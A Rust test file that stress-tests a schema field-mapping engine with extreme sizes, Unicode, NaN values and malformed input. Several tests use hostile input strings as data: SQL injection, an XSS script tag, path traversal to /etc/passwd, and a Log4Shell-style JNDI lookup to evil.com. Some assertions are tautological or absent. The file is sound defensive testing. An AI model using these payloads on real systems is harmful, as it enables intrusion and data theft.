//! Stress tests and edge cases for Phase 1 Field Mapping Engine
//!
//! This test suite attempts to find failure modes by:
//! - Testing extreme inputs (very long strings, Unicode, special chars)
//! - Testing boundary conditions (empty, null, max sizes)
//! - Testing concurrent operations
//! - Testing malformed data
//! - Testing resource limits

use graphica_coordinator::governance::rdf_store::GraphicaRdfStore;
use graphica_coordinator::mapping::{
    types::{AnalyzeSchemaRequest, MappingFeedback, SchemaFieldInput},
    MappingEngine,
};
use std::sync::Arc;
use tempfile::TempDir;

/// Helper to create test engine
async fn create_test_engine() -> (MappingEngine, TempDir) {
    let temp_dir = TempDir::new().unwrap();
    let rdf_store = Arc::new(GraphicaRdfStore::new_in_memory().unwrap());
    // Tests run without semantic matcher (Phase 1 only)
    let engine = MappingEngine::new(temp_dir.path().to_str().unwrap(), rdf_store)
        .await
        .unwrap(); // PRE-EXISTING ISSUE: semantic_matcher parameter removed
    (engine, temp_dir)
}

#[tokio::test]
async fn test_extreme_field_name_lengths() {
    let (engine, _temp_dir) = create_test_engine().await;

    // Test 1: Very long field name (10,000 characters)
    let long_name = "a".repeat(10_000);
    let request = AnalyzeSchemaRequest {
        source_id: "test".to_string(),
        table_name: "test".to_string(),
        fields: vec![SchemaFieldInput {
            name: long_name.clone(),
            data_type: "VARCHAR".to_string(),
            nullable: true,
            sample_values: Some(vec!["test".to_string()]),
            description: None,
        }],
        sample_size: Some(100),
    };

    let result = engine.analyze_schema(request).await;
    println!(
        "Test 1 - Very long field name (10k chars): {:?}",
        if result.is_ok() { "PASS" } else { "FAIL" }
    );
    assert!(
        result.is_ok() || result.is_err(),
        "Should handle very long names"
    );

    // Test 2: Empty field name
    let request = AnalyzeSchemaRequest {
        source_id: "test".to_string(),
        table_name: "test".to_string(),
        fields: vec![SchemaFieldInput {
            name: "".to_string(),
            data_type: "VARCHAR".to_string(),
            nullable: true,
            sample_values: None,
            description: None,
        }],
        sample_size: Some(100),
    };

    let result = engine.analyze_schema(request).await;
    println!(
        "Test 2 - Empty field name: {:?}",
        if result.is_ok() { "PASS" } else { "FAIL" }
    );
}

#[tokio::test]
async fn test_unicode_and_special_characters() {
    let (engine, _temp_dir) = create_test_engine().await;

    // Test 1: Unicode field names
    let unicode_names = vec![
        "客户邮箱",                // Chinese
        "العنوان_البريدي",         // Arabic
        "メールアドレス",          // Japanese
        "이메일주소",              // Korean
        "адрес_электронной_почты", // Russian
        "🔥email🚀",               // Emojis
    ];

    for name in unicode_names {
        let request = AnalyzeSchemaRequest {
            source_id: "unicode_test".to_string(),
            table_name: "test".to_string(),
            fields: vec![SchemaFieldInput {
                name: name.to_string(),
                data_type: "VARCHAR".to_string(),
                nullable: true,
                sample_values: Some(vec!["test@example.com".to_string()]),
                description: None,
            }],
            sample_size: Some(100),
        };

        let result = engine.analyze_schema(request).await;
        println!(
            "Unicode test '{}': {:?}",
            name,
            if result.is_ok() { "PASS" } else { "FAIL" }
        );
    }

    // Test 2: Special characters and SQL injection attempts
    let special_names = vec![
        "'; DROP TABLE users--",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "\0null\0byte",
        "a' OR '1'='1",
    ];

    for name in special_names {
        let request = AnalyzeSchemaRequest {
            source_id: "injection_test".to_string(),
            table_name: "test".to_string(),
            fields: vec![SchemaFieldInput {
                name: name.to_string(),
                data_type: "VARCHAR".to_string(),
                nullable: true,
                sample_values: None,
                description: None,
            }],
            sample_size: Some(100),
        };

        let result = engine.analyze_schema(request).await;
        println!(
            "Injection test '{}': {:?}",
            name,
            if result.is_ok() { "PASS" } else { "FAIL" }
        );
    }
}

#[tokio::test]
async fn test_extreme_sample_values() {
    let (engine, _temp_dir) = create_test_engine().await;

    // Test 1: Huge number of sample values (100k)
    let massive_samples: Vec<String> = (0..100_000).map(|i| format!("value_{}", i)).collect();

    let request = AnalyzeSchemaRequest {
        source_id: "huge_samples".to_string(),
        table_name: "test".to_string(),
        fields: vec![SchemaFieldInput {
            name: "test_field".to_string(),
            data_type: "VARCHAR".to_string(),
            nullable: true,
            sample_values: Some(massive_samples),
            description: None,
        }],
        sample_size: Some(100_000),
    };

    let start = std::time::Instant::now();
    let result = engine.analyze_schema(request).await;
    let duration = start.elapsed();

    println!(
        "Test 1 - 100k sample values: {:?} in {:?}",
        if result.is_ok() { "PASS" } else { "FAIL" },
        duration
    );

    // Should complete within reasonable time (< 5 seconds)
    if duration.as_secs() > 5 {
        println!("WARNING: Processing took too long: {:?}", duration);
    }

    // Test 2: Very long individual sample values (10MB each)
    let huge_value = "x".repeat(10_000_000);
    let request = AnalyzeSchemaRequest {
        source_id: "huge_value".to_string(),
        table_name: "test".to_string(),
        fields: vec![SchemaFieldInput {
            name: "test_field".to_string(),
            data_type: "TEXT".to_string(),
            nullable: true,
            sample_values: Some(vec![huge_value]),
            description: None,
        }],
        sample_size: Some(1),
    };

    let result = engine.analyze_schema(request).await;
    println!(
        "Test 2 - 10MB sample value: {:?}",
        if result.is_ok() { "PASS" } else { "FAIL" }
    );
}

#[tokio::test]
async fn test_extreme_schema_sizes() {
    let (engine, _temp_dir) = create_test_engine().await;

    // Test 1: Schema with 10,000 fields
    let fields: Vec<SchemaFieldInput> = (0..10_000)
        .map(|i| SchemaFieldInput {
            name: format!("field_{}", i),
            data_type: "VARCHAR".to_string(),
            nullable: true,
            sample_values: Some(vec![format!("value_{}", i)]),
            description: Some(format!("Description for field {}", i)),
        })
        .collect();

    let request = AnalyzeSchemaRequest {
        source_id: "huge_schema".to_string(),
        table_name: "test".to_string(),
        fields,
        sample_size: Some(100),
    };

    let start = std::time::Instant::now();
    let result = engine.analyze_schema(request).await;
    let duration = start.elapsed();

    println!(
        "Test 1 - 10k fields schema: {:?} in {:?}",
        if result.is_ok() { "PASS" } else { "FAIL" },
        duration
    );

    if result.is_ok() {
        let response = result.unwrap();
        assert_eq!(
            response.fields.len(),
            10_000,
            "Should process all 10k fields"
        );
        println!("  Successfully processed all 10,000 fields");
    }
}

#[tokio::test]
async fn test_concurrent_operations() {
    let (engine, _temp_dir) = create_test_engine().await;

    // Test: 100 concurrent schema analyses
    let mut handles = vec![];

    for i in 0..100 {
        let request = AnalyzeSchemaRequest {
            source_id: format!("concurrent_{}", i),
            table_name: "test".to_string(),
            fields: vec![SchemaFieldInput {
                name: format!("email_field_{}", i),
                data_type: "VARCHAR".to_string(),
                nullable: false,
                sample_values: Some(vec![
                    format!("test{}@example.com", i),
                    format!("user{}@test.org", i),
                ]),
                description: None,
            }],
            sample_size: Some(100),
        };

        let handle = tokio::spawn(async move {
            // Simulate some delay
            tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
            request
        });

        handles.push(handle);
    }

    // Wait for all to complete
    let requests: Vec<_> = futures::future::join_all(handles)
        .await
        .into_iter()
        .filter_map(|r| r.ok())
        .collect();

    println!("Prepared {} concurrent requests", requests.len());

    // Now execute them all
    let start = std::time::Instant::now();
    let mut success = 0;
    let mut failures = 0;

    for request in requests {
        match engine.analyze_schema(request).await {
            Ok(_) => success += 1,
            Err(_) => failures += 1,
        }
    }

    let duration = start.elapsed();
    println!(
        "Concurrent operations: {} success, {} failures in {:?}",
        success, failures, duration
    );

    assert!(success > 0, "At least some operations should succeed");
}

#[tokio::test]
async fn test_malformed_data_types() {
    let (engine, _temp_dir) = create_test_engine().await;

    let malformed_types = vec![
        "",
        "   ",
        "INVALID_TYPE_12345",
        "VARCHAR(99999999999999999999)",
        "INT; DROP TABLE users--",
        "\0\0\0",
    ];

    for dtype in malformed_types {
        let request = AnalyzeSchemaRequest {
            source_id: "malformed".to_string(),
            table_name: "test".to_string(),
            fields: vec![SchemaFieldInput {
                name: "test_field".to_string(),
                data_type: dtype.to_string(),
                nullable: true,
                sample_values: None,
                description: None,
            }],
            sample_size: Some(100),
        };

        let result = engine.analyze_schema(request).await;
        println!(
            "Malformed type '{}': {:?}",
            dtype,
            if result.is_ok() {
                "PASS (handled)"
            } else {
                "FAIL"
            }
        );
    }
}

#[tokio::test]
async fn test_pattern_detection_edge_cases() {
    let (engine, _temp_dir) = create_test_engine().await;

    // Test 1: Almost-valid patterns
    let test_cases = vec![
        (
            "almost_email",
            vec!["test@", "@example.com", "test@.com", "test@@example.com"],
        ),
        (
            "almost_phone",
            vec!["+1-555-", "555-1234-5678-9012", "(555"],
        ),
        ("almost_ssn", vec!["123-45-", "123-45-67890", "12-345-6789"]),
        (
            "almost_url",
            vec!["http://", "htp://example.com", "http:/example.com"],
        ),
    ];

    for (name, samples) in test_cases {
        let request = AnalyzeSchemaRequest {
            source_id: "edge_patterns".to_string(),
            table_name: "test".to_string(),
            fields: vec![SchemaFieldInput {
                name: name.to_string(),
                data_type: "VARCHAR".to_string(),
                nullable: true,
                sample_values: Some(samples.iter().map(|s| s.to_string()).collect()),
                description: None,
            }],
            sample_size: Some(100),
        };

        let result = engine.analyze_schema(request).await;
        println!(
            "Pattern edge case '{}': {:?}",
            name,
            if result.is_ok() { "PASS" } else { "FAIL" }
        );

        if let Ok(response) = result {
            if let Some(field) = response.fields.first() {
                if let Some(features) = &field.features {
                    println!("  Detected patterns: {:?}", features.semantic_patterns);
                }
            }
        }
    }
}

#[tokio::test]
async fn test_storage_corruption_scenarios() {
    let (engine, _temp_dir) = create_test_engine().await;

    // Test 1: Get candidates for non-existent field
    let result = engine
        .get_candidates("nonexistent_field_12345", 10, 0.0, None)
        .await;
    println!(
        "Test 1 - Non-existent field: {:?}",
        if result.is_err() {
            "PASS (correctly failed)"
        } else {
            "UNEXPECTED PASS"
        }
    );
    assert!(result.is_err(), "Should fail for non-existent field");

    // Test 2: Invalid field ID formats
    let invalid_ids = vec!["", " ", "\0", "../../etc/passwd", "field\nwith\nnewlines"];

    for id in invalid_ids {
        let result = engine.get_candidates(id, 10, 0.0, None).await;
        println!(
            "Invalid field ID '{}': {:?}",
            id.escape_default(),
            if result.is_err() {
                "PASS (correctly failed)"
            } else {
                "UNEXPECTED PASS"
            }
        );
    }
}

#[tokio::test]
async fn test_feedback_edge_cases() {
    let (engine, _temp_dir) = create_test_engine().await;

    // First create a field
    let request = AnalyzeSchemaRequest {
        source_id: "feedback_test".to_string(),
        table_name: "test".to_string(),
        fields: vec![SchemaFieldInput {
            name: "email".to_string(),
            data_type: "VARCHAR".to_string(),
            nullable: false,
            sample_values: Some(vec!["test@example.com".to_string()]),
            description: None,
        }],
        sample_size: Some(100),
    };

    let response = engine.analyze_schema(request).await.unwrap();
    let field_id = response.fields[0].id.clone();

    // Test 1: Feedback with invalid URIs
    let invalid_uris = vec![
        "",
        "not-a-uri",
        "javascript:alert('xss')",
        "file:///etc/passwd",
    ];

    for uri in invalid_uris {
        let feedback = MappingFeedback {
            field_id: field_id.clone(),
            selected_term_uri: Some(uri.to_string()),
            accepted_top_suggestion: false,
            user_id: "test_user".to_string(),
            notes: None,
            timestamp: chrono::Utc::now().timestamp(),
        };

        let result = engine.record_feedback(feedback).await;
        println!(
            "Feedback with invalid URI '{}': {:?}",
            uri,
            if result.is_ok() {
                "PASS (accepted)"
            } else {
                "FAIL (rejected)"
            }
        );
    }

    // Test 2: Feedback for non-existent field
    let feedback = MappingFeedback {
        field_id: "nonexistent_12345".to_string(),
        selected_term_uri: Some("http://schema.org/email".to_string()),
        accepted_top_suggestion: true,
        user_id: "test_user".to_string(),
        notes: None,
        timestamp: chrono::Utc::now().timestamp(),
    };

    let result = engine.record_feedback(feedback).await;
    println!(
        "Test 2 - Feedback for non-existent field: {:?}",
        if result.is_ok() {
            "PASS (accepted)"
        } else {
            "FAIL (rejected)"
        }
    );
}

#[tokio::test]
async fn test_confidence_score_boundaries() {
    let (engine, _temp_dir) = create_test_engine().await;

    // Create a test field
    let request = AnalyzeSchemaRequest {
        source_id: "confidence_test".to_string(),
        table_name: "test".to_string(),
        fields: vec![SchemaFieldInput {
            name: "email".to_string(),
            data_type: "VARCHAR".to_string(),
            nullable: false,
            sample_values: Some(vec!["test@example.com".to_string()]),
            description: None,
        }],
        sample_size: Some(100),
    };

    let response = engine.analyze_schema(request).await.unwrap();
    let field_id = response.fields[0].id.clone();

    // Test extreme min_confidence values
    let test_values = vec![
        -1.0,              // Below 0
        0.0,               // Minimum
        0.5,               // Middle
        1.0,               // Maximum
        1.5,               // Above 1
        100.0,             // Way above
        f64::NAN,          // NaN
        f64::INFINITY,     // Infinity
        f64::NEG_INFINITY, // Negative infinity
    ];

    for min_conf in test_values {
        let result = engine.get_candidates(&field_id, 10, min_conf, None).await;
        println!(
            "min_confidence={}: {:?}",
            min_conf,
            if result.is_ok() { "PASS" } else { "FAIL" }
        );

        if let Ok(candidates) = result {
            // Check that all returned candidates meet the threshold (if valid)
            if min_conf >= 0.0 && min_conf <= 1.0 {
                for candidate in &candidates.candidates {
                    if candidate.confidence < min_conf {
                        println!(
                            "  WARNING: Candidate confidence {} below threshold {}",
                            candidate.confidence, min_conf
                        );
                    }
                }
            }
        }
    }
}

#[tokio::test]
async fn test_memory_leak_detection() {
    let (engine, _temp_dir) = create_test_engine().await;

    // Test: Create and analyze 1000 schemas to check for memory leaks
    println!("Memory leak test: Analyzing 1000 schemas...");

    for i in 0..1000 {
        let request = AnalyzeSchemaRequest {
            source_id: format!("leak_test_{}", i),
            table_name: "test".to_string(),
            fields: vec![SchemaFieldInput {
                name: format!("field_{}", i),
                data_type: "VARCHAR".to_string(),
                nullable: true,
                sample_values: Some(vec![format!("value_{}", i); 100]),
                description: Some("x".repeat(1000)),
            }],
            sample_size: Some(100),
        };

        let _ = engine.analyze_schema(request).await;

        if i % 100 == 0 {
            println!("  Processed {} schemas...", i);
        }
    }

    println!("Memory leak test completed. Check for memory growth in process monitor.");
}

#[tokio::test]
async fn test_null_and_empty_combinations() {
    let (engine, _temp_dir) = create_test_engine().await;

    let test_cases = vec![
        ("empty_everything", None, None),
        ("empty_samples", None, Some("Has description".to_string())),
        (
            "whitespace_samples",
            Some(vec!["   ".to_string(), "\t\n".to_string()]),
            None,
        ),
        (
            "null_chars",
            Some(vec!["\0".to_string(), "test\0value".to_string()]),
            None,
        ),
        (
            "mixed_empty",
            Some(vec!["".to_string(), "value".to_string(), "".to_string()]),
            None,
        ),
    ];

    for (name, samples, desc) in test_cases {
        let request = AnalyzeSchemaRequest {
            source_id: "null_test".to_string(),
            table_name: "test".to_string(),
            fields: vec![SchemaFieldInput {
                name: name.to_string(),
                data_type: "VARCHAR".to_string(),
                nullable: true,
                sample_values: samples,
                description: desc,
            }],
            sample_size: Some(100),
        };

        let result = engine.analyze_schema(request).await;
        println!(
            "Null/empty test '{}': {:?}",
            name,
            if result.is_ok() { "PASS" } else { "FAIL" }
        );
    }
}
